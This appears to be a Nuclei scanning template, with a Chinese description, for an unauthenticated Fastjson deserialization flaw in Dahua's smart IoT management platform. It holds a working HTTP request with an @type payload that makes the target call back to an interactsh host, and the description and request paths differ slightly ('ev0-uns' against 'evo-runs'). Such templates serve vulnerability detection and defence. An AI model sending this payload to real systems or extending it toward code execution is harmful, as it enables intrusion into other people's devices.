id: dahua-random-fastjson
info:
  name: "大华智能物联综合管理平台 random 接口 Fastjson 反序列化漏洞"
  author: Unknown
  severity: critical
  description: 大华智能物联综合管理平台因集成存在安全缺陷的Fastson组件，在未实施有效身份验证机制的情况下，攻击者可通过操控/ev0-uns/v1.0/auths/sysusers/random接口传输特制的恶意序列化数据，触发反序列化漏洞，从而在目标系统上执行任意代码。
  tags: 大华智能物联综合管理平台

http:
- raw:
  - |
    POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    Content-Type: application/json;charset=utf-8
    Accept-Encoding: gzip
    Connection: close

    {
       "a":{
           "@type":"com.alibaba.fastjson.JSONObject",
           {"@type":"java.net.URL","val":"http://{{interactsh-url}}"}
           }""
    }



  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - "dns"





